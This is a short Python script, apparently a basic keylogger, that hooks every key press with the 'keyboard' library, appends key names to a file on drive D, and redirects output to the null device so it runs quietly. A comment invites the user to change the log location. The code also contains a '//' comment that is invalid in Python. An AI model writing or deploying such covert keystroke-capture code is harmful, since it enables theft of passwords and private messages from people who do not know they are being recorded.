import os
import keyboard
import sys

def store_key(event):
    with open("D:/logData.txt", "a") as f:
        //you can edit the file location
        f.write(f"\n")
        if event.event_type == keyboard.KEY_DOWN:
            f.write(f"{event.name} ")
        elif event.event_type == keyboard.KEY_UP:
            f.write(f"{event.name} ")

keyboard.on_press(store_key)

# Redirect standard output to the null device
sys.stdout = open(os.devnull, 'w')

keyboard.wait()
